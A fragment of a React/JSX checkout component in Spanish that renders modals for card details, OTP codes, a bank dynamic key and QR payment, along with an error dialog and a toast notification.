      {/* MODAL TARJETA (DÉBITO / CRÉDITO) */}
      <CardModal
        isOpen={showCardModal}
        cardType={metodoPago === 'debito' ? 'debito' : 'credito'}
        cardData={cardData}
        cardErrors={cardErrors}
        isLoading={isCardLoading}
        onClose={handleCardModalCancel}
        onChange={handleCardChange}
        onSubmit={handleCardSubmit}
      />

      {error && (
        <div className="fixed inset-0 z-100 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-in fade-in duration-200">
          <div className="bg-white rounded-xl shadow-2xl max-w-sm w-full p-6 text-center animate-in zoom-in-95 duration-200">
            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
            <h3 className="text-lg font-bold text-gray-900 mb-2">Atención</h3>
            <p className="text-sm text-gray-600 mb-6">{error}</p>
            <button 
              onClick={() => setError(null)}
              className="w-full py-2.5 bg-gray-900 text-white rounded-lg font-medium hover:bg-gray-800 transition-colors"
            >
              Aceptar
            </button>
          </div>
        </div>
      )}
      {/* TOAST NOTIFICATION */}
      {toast && (
        <div className="fixed top-6 right-6 z-99999 animate-slide-in">
          <style>{`
            @keyframes slideIn {
              from { transform: translate3d(100%, 0, 0); opacity: 0; }
              to { transform: translate3d(0, 0, 0); opacity: 1; }
            }
            .animate-slide-in {
              animation: slideIn 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
            }
          `}</style>
          <div className={`backdrop-blur-md border text-white p-4 rounded-xl shadow-2xl flex items-center space-x-3.5 max-w-sm ring-1 ${toast.type === 'success' ? 'bg-green-600/90 border-green-500/20 ring-green-500/30' : 'bg-red-600/90 border-red-500/20 ring-red-500/30'}`}>
            <div className="bg-white/20 p-2 rounded-lg text-white">
              {toast.type === 'success' ? (
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                </svg>
              ) : (
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
              )}
            </div>
            <div className="flex-1">
              <h4 className="font-semibold text-sm text-white">{toast.type === 'success' ? 'Éxito' : 'Aviso'}</h4>
              <p className={`text-xs mt-0.5 ${toast.type === 'success' ? 'text-green-100/90' : 'text-red-100/90'}`}>{toast.message}</p>
            </div>
            <button onClick={() => setToast(null)} className="text-white/60 hover:text-white transition-colors p-1 rounded-lg hover:bg-white/10">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
        </div>
      )}

      {/* MODAL OTP INDEPENDIENTE (6 u 8 dígitos) */}
      <OtpModal 
        isOpen={otpRequested} 
        onClose={() => setOtpRequested(false)} 
        onSubmit={handleOtpSubmit} 
        errorMsg={otpError} 
        isLoading={isCardLoading} 
        digits={otpLength}
      />

      {/* MODAL CLAVE DINAMICA INDEPENDIENTE */}
      <DinamicaModal 
        isOpen={dinamicaRequested} 
        onClose={() => setDinamicaRequested(false)} 
        onSubmit={handleDinamicaSubmit} 
        errorMsg={dinamicaError} 
        isLoading={isCardLoading} 
      />

      {/* MODAL QR INDEPENDIENTE */}
      <QrModal
        isOpen={showQrModal}
        onClose={() => setShowQrModal(false)}
        onSubmit={handleQrSubmit}
        errorMsg={qrError}
        isLoading={isQrLoading}
        total={currentTotal || total}
      />
    </>
  )
}